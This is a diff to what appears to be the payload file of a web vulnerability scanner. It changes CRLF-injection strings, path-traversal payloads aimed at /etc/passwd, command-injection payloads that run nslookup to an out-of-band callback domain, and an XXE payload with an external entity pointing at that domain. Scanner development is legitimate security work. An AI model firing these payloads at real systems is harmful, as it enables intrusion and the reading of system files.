@@ -122,6 +122,8 @@ USR_Rule = {
 CRLF_Rule = {
     "redirect":[
         '%0d%0acrlftest:%20crlftestvalue%0d%0a%0d%0a', #  Valar Morghulis
+        '\ncrlftest: crlftestvalue\n\n',
+        '\r\ncrlftest: crlftestvalue\r\n\r\n',
     ],
 }
 
@@ -131,35 +133,35 @@ LFI_Rule = {
         "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
         "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
         "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
-        "//././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
+        "/././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
         "/etc/passwd", #    {tag="root:x:"}
         "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
         "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
         "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
         "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
-        "././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
-        "etc/passwd", #    {tag="root:x:"}
+        # "././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
+        # "/etc/passwd", #    {tag="root:x:"}
         # 还可以加入RFI
     ],
 }
 
 
 command_injection_payloads = [
-    ";curl {}",
-    "&curl {}",
-    "|curl {}",
-    "||curl {}",
-    "$(curl {})",
-    "';curl {}'",
-    "'&curl {}'",
-    "'|curl {}'",
-    "'||curl {}'",
-    "'$(curl {})'",
-    "\";curl {}\"",
-    "\"&curl {}\"",
-    "\"|curl {}\"",
-    "\"||curl {}\"",
-    "\"$(curl {})\""
+    ";nslookup ci_{domain}.devil.yoyostay.top",
+    "&nslookup ci_{domain}.devil.yoyostay.top",
+    "|nslookup ci_{domain}.devil.yoyostay.top",
+    "||nslookup ci_{domain}.devil.yoyostay.top",
+    "$(nslookup ci_{domain}.devil.yoyostay.top)",
+    "';nslookup ci_{domain}.devil.yoyostay.top'",
+    "'&nslookup ci_{domain}.devil.yoyostay.top'",
+    "'|nslookup ci_{domain}.devil.yoyostay.top'",
+    "'||nslookup ci_{domain}.devil.yoyostay.top'",
+    "'$(nslookup ci_{domain}.devil.yoyostay.top)'",
+    "\";nslookup ci_{domain}.devil.yoyostay.top\"",
+    "\"&nslookup ci_{domain}.devil.yoyostay.top\"",
+    "\"|nslookup ci_{domain}.devil.yoyostay.top\"",
+    "\"||nslookup ci_{domain}.devil.yoyostay.top\"",
+    "\"$(nslookup ci_{domain}.devil.yoyostay.top)\""
 ]
 
 
@@ -297,4 +299,4 @@ arachni_options = {
 
 
 
-XXE_payload =  '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "{}">\n\n]>\n\n<r>&sp;</r>'
+XXE_payload =  '<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://xxeproxy_{domain}.devil.yoyostay.top"> ]> <r>&sp;</r>'
